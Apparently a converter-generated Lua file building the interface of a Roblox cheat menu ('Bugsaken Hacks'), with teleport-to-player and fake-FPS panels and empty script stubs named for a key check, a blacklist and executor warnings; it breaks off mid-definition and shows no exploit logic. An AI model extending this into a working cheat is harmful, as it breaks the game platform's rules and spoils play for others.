--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 482 | Scripts: 95 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.Real Deal V2
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Name"] = [[Real Deal V2]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.Real Deal V2.LocalScript
G2L["2"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.Real Deal V2.KeyORELSE
G2L["3"] = Instance.new("LocalScript", G2L["1"]);
G2L["3"]["Name"] = [[KeyORELSE]];


-- StarterGui.Real Deal V2.LocalScript
G2L["4"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.Real Deal V2.Blacklist
G2L["5"] = Instance.new("LocalScript", G2L["1"]);
G2L["5"]["Name"] = [[Blacklist]];


-- StarterGui.Real Deal V2.WarningForBadExecutors
G2L["6"] = Instance.new("LocalScript", G2L["1"]);
G2L["6"]["Name"] = [[WarningForBadExecutors]];


-- StarterGui.Real Deal V2.LocalScript
G2L["7"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.Real Deal V2.AlrRunnin
G2L["8"] = Instance.new("LocalScript", G2L["1"]);
G2L["8"]["Name"] = [[AlrRunnin]];


-- StarterGui.Real Deal V2.LocalScript
G2L["9"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.Real Deal V2.Main
G2L["a"] = Instance.new("Folder", G2L["1"]);
G2L["a"]["Name"] = [[Main]];


-- StarterGui.Real Deal V2.Main.TpUI
G2L["b"] = Instance.new("Folder", G2L["a"]);
G2L["b"]["Name"] = [[TpUI]];


-- StarterGui.Real Deal V2.Main.TpUI.LocalScript
G2L["c"] = Instance.new("LocalScript", G2L["b"]);



-- StarterGui.Real Deal V2.Main.TpUI.TPUI
G2L["d"] = Instance.new("TextLabel", G2L["b"]);
G2L["d"]["TextWrapped"] = true;
G2L["d"]["ZIndex"] = 10;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["TextSize"] = 26;
G2L["d"]["TextScaled"] = true;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["BackgroundTransparency"] = 1;
G2L["d"]["Size"] = UDim2.new(0.29748, 0, 0.07257, 0);
G2L["d"]["Visible"] = false;
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Text"] = [[Teleport To Player UI]];
G2L["d"]["Name"] = [[TPUI]];
G2L["d"]["Position"] = UDim2.new(0.59725, 0, 0.31833, 0);


-- StarterGui.Real Deal V2.Main.TpUI.MainFrame
G2L["e"] = Instance.new("Frame", G2L["b"]);
G2L["e"]["Visible"] = false;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27);
G2L["e"]["Size"] = UDim2.new(0.29749, 0, 0.07372, 0);
G2L["e"]["Position"] = UDim2.new(0.60481, 0, 0.31704, 0);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Name"] = [[MainFrame]];


-- StarterGui.Real Deal V2.Main.TpUI.MainFrame.Dragg
G2L["f"] = Instance.new("LocalScript", G2L["e"]);
G2L["f"]["Name"] = [[Dragg]];


-- StarterGui.Real Deal V2.Main.TpUI.MainFrame.UICorner
G2L["10"] = Instance.new("UICorner", G2L["e"]);
G2L["10"]["CornerRadius"] = UDim.new(0.3, 0);


-- StarterGui.Real Deal V2.Main.TpUI.MainFrame.UIStroke
G2L["11"] = Instance.new("UIStroke", G2L["e"]);
G2L["11"]["Thickness"] = 4;


-- StarterGui.Real Deal V2.Main.TpUI.TextButton
G2L["12"] = Instance.new("TextButton", G2L["b"]);
G2L["12"]["TextWrapped"] = true;
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextSize"] = 38;
G2L["12"]["TextScaled"] = true;
G2L["12"]["TextColor3"] = Color3.fromRGB(204, 218, 216);
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(87, 87, 87);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Creepster.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["ZIndex"] = 12;
G2L["12"]["BackgroundTransparency"] = 1;
G2L["12"]["Size"] = UDim2.new(0.02491, 0, 0.07372, 0);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[V]];
G2L["12"]["Visible"] = false;
G2L["12"]["Position"] = UDim2.new(0.87738, 0, 0.31833, 0);


-- StarterGui.Real Deal V2.Main.TpUI.TextButton.LocalScript
G2L["13"] = Instance.new("LocalScript", G2L["12"]);



-- StarterGui.Real Deal V2.Main.TpUI.TextButton.ScrollingFrame
G2L["14"] = Instance.new("ScrollingFrame", G2L["12"]);
G2L["14"]["Active"] = true;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["CanvasSize"] = UDim2.new(0, 0, 30, 0);
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
G2L["14"]["Size"] = UDim2.new(12.0256, 0, 4.21954, 0);
G2L["14"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Position"] = UDim2.new(-10.94156, 0, 0.98, 0);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["BackgroundTransparency"] = 1;


-- StarterGui.Real Deal V2.Main.TpUI.TextButton.ScrollingFrame.exit
G2L["15"] = Instance.new("TextButton", G2L["14"]);
G2L["15"]["TextWrapped"] = true;
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["TextSize"] = 38;
G2L["15"]["TextScaled"] = true;
G2L["15"]["TextDirection"] = Enum.TextDirection.LeftToRight;
G2L["15"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(137, 137, 137);
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15"]["Size"] = UDim2.new(0.94, 0, 0.04, 0);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Text"] = [[Exit?]];
G2L["15"]["Name"] = [[exit]];
G2L["15"]["Position"] = UDim2.new(0.015, 0, 0.95, 0);


-- StarterGui.Real Deal V2.Main.TpUI.TextButton.ScrollingFrame.exit.LocalScript
G2L["16"] = Instance.new("LocalScript", G2L["15"]);



-- StarterGui.Real Deal V2.Main.TpUI.TextButton.ScrollingFrame.exit.UICorner
G2L["17"] = Instance.new("UICorner", G2L["15"]);
G2L["17"]["CornerRadius"] = UDim.new(0.3, 0);


-- StarterGui.Real Deal V2.Main.TpUI.TextButton.ScrollingFrame.exit.UIStroke
G2L["18"] = Instance.new("UIStroke", G2L["15"]);
G2L["18"]["Thickness"] = 4;
G2L["18"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.TpUI.TextButton.ScrollingFrame.TextButton
G2L["19"] = Instance.new("TextButton", G2L["14"]);
G2L["19"]["TextWrapped"] = true;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["TextSize"] = 38;
G2L["19"]["TextScaled"] = true;
G2L["19"]["TextDirection"] = Enum.TextDirection.LeftToRight;
G2L["19"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(137, 137, 137);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["Size"] = UDim2.new(0.94, 0, 0.04, 0);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Position"] = UDim2.new(0.01493, 0, 0.00424, 0);


-- StarterGui.Real Deal V2.Main.TpUI.TextButton.ScrollingFrame.TextButton.UICorner
G2L["1a"] = Instance.new("UICorner", G2L["19"]);
G2L["1a"]["CornerRadius"] = UDim.new(0.3, 0);


-- StarterGui.Real Deal V2.Main.TpUI.TextButton.ScrollingFrame.TextButton.UIStroke
G2L["1b"] = Instance.new("UIStroke", G2L["19"]);
G2L["1b"]["Thickness"] = 4;
G2L["1b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.TpUI.TextButton.UICorner
G2L["1c"] = Instance.new("UICorner", G2L["12"]);
G2L["1c"]["CornerRadius"] = UDim.new(0.3, 0);


-- StarterGui.Real Deal V2.Main.FPSCounter
G2L["1d"] = Instance.new("Folder", G2L["a"]);
G2L["1d"]["Name"] = [[FPSCounter]];


-- StarterGui.Real Deal V2.Main.FPSCounter.LocalScript
G2L["1e"] = Instance.new("LocalScript", G2L["1d"]);



-- StarterGui.Real Deal V2.Main.FPSCounter.Disable
G2L["1f"] = Instance.new("LocalScript", G2L["1d"]);
G2L["1f"]["Name"] = [[Disable]];


-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup
G2L["20"] = Instance.new("CanvasGroup", G2L["1d"]);
G2L["20"]["Visible"] = false;
G2L["20"]["ZIndex"] = 123123;
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(100, 100, 100);
G2L["20"]["Size"] = UDim2.new(0.107, 0, 0.046, 0);
G2L["20"]["Position"] = UDim2.new(0.51401, 0, 0.51266, 0);
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel
G2L["21"] = Instance.new("TextLabel", G2L["20"]);
G2L["21"]["TextWrapped"] = true;
G2L["21"]["ZIndex"] = 123124;
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["TextSize"] = 14;
G2L["21"]["TextScaled"] = true;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(100, 100, 100);
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Size"] = UDim2.new(0.85031, 0, 1, 0);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Text"] = [[FPS]];
G2L["21"]["Position"] = UDim2.new(0.06845, 0, 0, 0);
-- Attributes
G2L["21"]:SetAttribute([[Max]], 0);
G2L["21"]:SetAttribute([[Min]], 0);
G2L["21"]:SetAttribute([[fakefps]], false);


-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["21"]);



-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.TextButton
G2L["23"] = Instance.new("TextButton", G2L["21"]);
G2L["23"]["TextWrapped"] = true;
G2L["23"]["BorderSizePixel"] = 0;
G2L["23"]["TextSize"] = 14;
G2L["23"]["TextScaled"] = true;
G2L["23"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["ZIndex"] = 123124;
G2L["23"]["Size"] = UDim2.new(0.10383, 0, 0.4744, 0);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Text"] = [[X]];
G2L["23"]["Position"] = UDim2.new(0.99157, 0, 0.0222, 0);


-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.TextButton.LocalScript
G2L["24"] = Instance.new("LocalScript", G2L["23"]);



-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.TextButton.UICorner
G2L["25"] = Instance.new("UICorner", G2L["23"]);
G2L["25"]["CornerRadius"] = UDim.new(0, 60);


-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.TextButton.UIStroke
G2L["26"] = Instance.new("UIStroke", G2L["23"]);
G2L["26"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.ImageButton
G2L["27"] = Instance.new("ImageButton", G2L["21"]);
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["ZIndex"] = 123124;
G2L["27"]["Image"] = [[rbxassetid://7059346373]];
G2L["27"]["Size"] = UDim2.new(0.104, 0, 0.4518, 0);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Position"] = UDim2.new(-0.08177, 0, 0.0222, 0);


-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.ImageButton.LocalScript
G2L["28"] = Instance.new("LocalScript", G2L["27"]);



-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.ImageButton.UICorner
G2L["29"] = Instance.new("UICorner", G2L["27"]);
G2L["29"]["CornerRadius"] = UDim.new(0, 60);


-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.TextLabel.ImageButton.UIStroke
G2L["2a"] = Instance.new("UIStroke", G2L["27"]);
G2L["2a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.UICorner
G2L["2b"] = Instance.new("UICorner", G2L["20"]);
G2L["2b"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.UIStroke
G2L["2c"] = Instance.new("UIStroke", G2L["20"]);
G2L["2c"]["ZIndex"] = 123124;


-- StarterGui.Real Deal V2.Main.FPSCounter.CanvasGroup.UIDragDetector
G2L["2d"] = Instance.new("UIDragDetector", G2L["20"]);



-- StarterGui.Real Deal V2.Main.FPSCounter.TextButton
G2L["2e"] = Instance.new("TextButton", G2L["1d"]);
G2L["2e"]["TextWrapped"] = true;
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["TextSize"] = 14;
G2L["2e"]["TextScaled"] = true;
G2L["2e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2e"]["Size"] = UDim2.new(0.16013, 0, 0.07911, 0);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["Text"] = [[Fake Fps? : OFF]];
G2L["2e"]["Visible"] = false;
G2L["2e"]["Position"] = UDim2.new(0.79619, 0, 0.78481, 0);
-- Attributes
G2L["2e"]:SetAttribute([[on]], false);


-- StarterGui.Real Deal V2.Main.FPSCounter.TextButton.LocalScript
G2L["2f"] = Instance.new("LocalScript", G2L["2e"]);



-- StarterGui.Real Deal V2.Main.FPSCounter.TextButton.UICorner
G2L["30"] = Instance.new("UICorner", G2L["2e"]);
G2L["30"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.FPSCounter.TextButton.Min
G2L["31"] = Instance.new("TextBox", G2L["2e"]);
G2L["31"]["Name"] = [[Min]];
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextWrapped"] = true;
G2L["31"]["TextSize"] = 14;
G2L["31"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["TextScaled"] = true;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["31"]["Position"] = UDim2.new(0, 0, -1, 0);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Text"] = [[MIN FAKE FPS]];


-- StarterGui.Real Deal V2.Main.FPSCounter.TextButton.Min.UICorner
G2L["32"] = Instance.new("UICorner", G2L["31"]);
G2L["32"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.FPSCounter.TextButton.Max
G2L["33"] = Instance.new("TextBox", G2L["2e"]);
G2L["33"]["Name"] = [[Max]];
G2L["33"]["BorderSizePixel"] = 0;
G2L["33"]["TextWrapped"] = true;
G2L["33"]["TextSize"] = 14;
G2L["33"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["TextScaled"] = true;
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["33"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["33"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["33"]["Position"] = UDim2.new(0.5, 0, -1, 0);
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["Text"] = [[MAX FAKE FPS]];


-- StarterGui.Real Deal V2.Main.FPSCounter.TextButton.Max.UICorner
G2L["34"] = Instance.new("UICorner", G2L["33"]);
G2L["34"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.FPSCounter.TextBox
G2L["35"] = Instance.new("TextBox", G2L["1d"]);
G2L["35"]["Visible"] = false;
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["TextWrapped"] = true;
G2L["35"]["TextSize"] = 14;
G2L["35"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["TextScaled"] = true;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["35"]["Size"] = UDim2.new(0.1586, 0, 0.07911, 0);
G2L["35"]["Position"] = UDim2.new(0.44726, 0, 0.21203, 0);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Text"] = [[CHANGE COLOR HEX ONLY]];


-- StarterGui.Real Deal V2.Main.FPSCounter.TextBox.UICorner
G2L["36"] = Instance.new("UICorner", G2L["35"]);
G2L["36"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.FPSCounter.TextBox.TextButton
G2L["37"] = Instance.new("TextButton", G2L["35"]);
G2L["37"]["TextWrapped"] = true;
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["TextSize"] = 14;
G2L["37"]["TextScaled"] = true;
G2L["37"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["37"]["Size"] = UDim2.new(1.00961, 0, 1, 0);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Text"] = [[PRESS ME AFTER]];
G2L["37"]["Position"] = UDim2.new(0, 0, 1, 0);


-- StarterGui.Real Deal V2.Main.FPSCounter.TextBox.TextButton.LocalScript
G2L["38"] = Instance.new("LocalScript", G2L["37"]);



-- StarterGui.Real Deal V2.Main.FPSCounter.TextBox.TextButton.UICorner
G2L["39"] = Instance.new("UICorner", G2L["37"]);
G2L["39"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.FPSCounter.R
G2L["3a"] = Instance.new("TextBox", G2L["1d"]);
G2L["3a"]["Visible"] = false;
G2L["3a"]["Name"] = [[R]];
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["TextWrapped"] = true;
G2L["3a"]["TextSize"] = 14;
G2L["3a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["TextScaled"] = true;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3a"]["Size"] = UDim2.new(0.04758, 0, 0.07911, 0);
G2L["3a"]["Position"] = UDim2.new(0.24425, 0, 0.52848, 0);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Text"] = [[R]];


-- StarterGui.Real Deal V2.Main.FPSCounter.R.UICorner
G2L["3b"] = Instance.new("UICorner", G2L["3a"]);
G2L["3b"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.FPSCounter.G
G2L["3c"] = Instance.new("TextBox", G2L["1d"]);
G2L["3c"]["Visible"] = false;
G2L["3c"]["Name"] = [[G]];
G2L["3c"]["BorderSizePixel"] = 0;
G2L["3c"]["TextWrapped"] = true;
G2L["3c"]["TextSize"] = 14;
G2L["3c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["TextScaled"] = true;
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["3c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3c"]["Size"] = UDim2.new(0.04758, 0, 0.07911, 0);
G2L["3c"]["Position"] = UDim2.new(0.29183, 0, 0.52848, 0);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["Text"] = [[G]];


-- StarterGui.Real Deal V2.Main.FPSCounter.G.UICorner
G2L["3d"] = Instance.new("UICorner", G2L["3c"]);
G2L["3d"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.FPSCounter.B
G2L["3e"] = Instance.new("TextBox", G2L["1d"]);
G2L["3e"]["Visible"] = false;
G2L["3e"]["Name"] = [[B]];
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["TextWrapped"] = true;
G2L["3e"]["TextSize"] = 14;
G2L["3e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["TextScaled"] = true;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3e"]["Size"] = UDim2.new(0.04758, 0, 0.07911, 0);
G2L["3e"]["Position"] = UDim2.new(0.33862, 0, 0.52848, 0);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Text"] = [[B]];


-- StarterGui.Real Deal V2.Main.FPSCounter.B.UICorner
G2L["3f"] = Instance.new("UICorner", G2L["3e"]);
G2L["3f"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.FPSCounter.B.TextButton
G2L["40"] = Instance.new("TextButton", G2L["3e"]);
G2L["40"]["TextWrapped"] = true;
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["TextSize"] = 14;
G2L["40"]["TextScaled"] = true;
G2L["40"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(49, 49, 49);
G2L["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["40"]["Size"] = UDim2.new(3.02882, 0, 1, 0);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["Text"] = [[PRESS ME AFTER]];
G2L["40"]["Position"] = UDim2.new(-2, 0, 1, 0);


-- StarterGui.Real Deal V2.Main.FPSCounter.B.TextButton.LocalScript
G2L["41"] = Instance.new("LocalScript", G2L["40"]);



-- StarterGui.Real Deal V2.Main.FPSCounter.B.TextButton.UICorner
G2L["42"] = Instance.new("UICorner", G2L["40"]);
G2L["42"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.CanvasGroup
G2L["43"] = Instance.new("CanvasGroup", G2L["a"]);
G2L["43"]["BorderSizePixel"] = 0;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(32, 159, 173);
G2L["43"]["Size"] = UDim2.new(0.23274, 0, 0.60379, 0);
G2L["43"]["Position"] = UDim2.new(0.239, 0, 0.214, 0);
G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.Tab
G2L["44"] = Instance.new("LocalScript", G2L["43"]);
G2L["44"]["Name"] = [[Tab]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.UICorner
G2L["45"] = Instance.new("UICorner", G2L["43"]);
G2L["45"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.CanvasGroup.UIStroke
G2L["46"] = Instance.new("UIStroke", G2L["43"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame
G2L["47"] = Instance.new("Frame", G2L["43"]);
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(108, 108, 108);
G2L["47"]["Size"] = UDim2.new(0.99947, 0, 0.08711, 0);
G2L["47"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.Drag
G2L["48"] = Instance.new("LocalScript", G2L["47"]);
G2L["48"]["Name"] = [[Drag]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.UIStroke
G2L["49"] = Instance.new("UIStroke", G2L["47"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.MainText
G2L["4a"] = Instance.new("TextLabel", G2L["47"]);
G2L["4a"]["TextWrapped"] = true;
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["TextSize"] = 14;
G2L["4a"]["TextScaled"] = true;
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["BackgroundTransparency"] = 1;
G2L["4a"]["Size"] = UDim2.new(0.98788, 0, 1.01915, 0);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Text"] = [[Bugsaken Hacks]];
G2L["4a"]["Name"] = [[MainText]];
G2L["4a"]["Position"] = UDim2.new(-0.00254, 0, -0.01915, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.MainText.NOTURBUSSINESS
G2L["4b"] = Instance.new("LocalScript", G2L["4a"]);
G2L["4b"]["Name"] = [[NOTURBUSSINESS]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.Close
G2L["4c"] = Instance.new("TextButton", G2L["47"]);
G2L["4c"]["TextWrapped"] = true;
G2L["4c"]["BorderSizePixel"] = 0;
G2L["4c"]["TextSize"] = 14;
G2L["4c"]["TextScaled"] = true;
G2L["4c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(255, 8, 103);
G2L["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4c"]["Size"] = UDim2.new(0.08651, 0, 0.84425, 0);
G2L["4c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c"]["Text"] = [[X]];
G2L["4c"]["Name"] = [[Close]];
G2L["4c"]["Position"] = UDim2.new(0.89822, 0, 0.07449, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.Close.LocalScript
G2L["4d"] = Instance.new("LocalScript", G2L["4c"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.Close.UICorner
G2L["4e"] = Instance.new("UICorner", G2L["4c"]);
G2L["4e"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.Close.UIStroke
G2L["4f"] = Instance.new("UIStroke", G2L["4c"]);
G2L["4f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.Frame.Close.UIAspectRatioConstraint
G2L["50"] = Instance.new("UIAspectRatioConstraint", G2L["4c"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame
G2L["51"] = Instance.new("ScrollingFrame", G2L["43"]);
G2L["51"]["Active"] = true;
G2L["51"]["ScrollingDirection"] = Enum.ScrollingDirection.X;
G2L["51"]["BorderSizePixel"] = 0;
G2L["51"]["CanvasSize"] = UDim2.new(6, 0, 0, 0);
G2L["51"]["CanvasPosition"] = Vector2.new(1626.42407, 0);
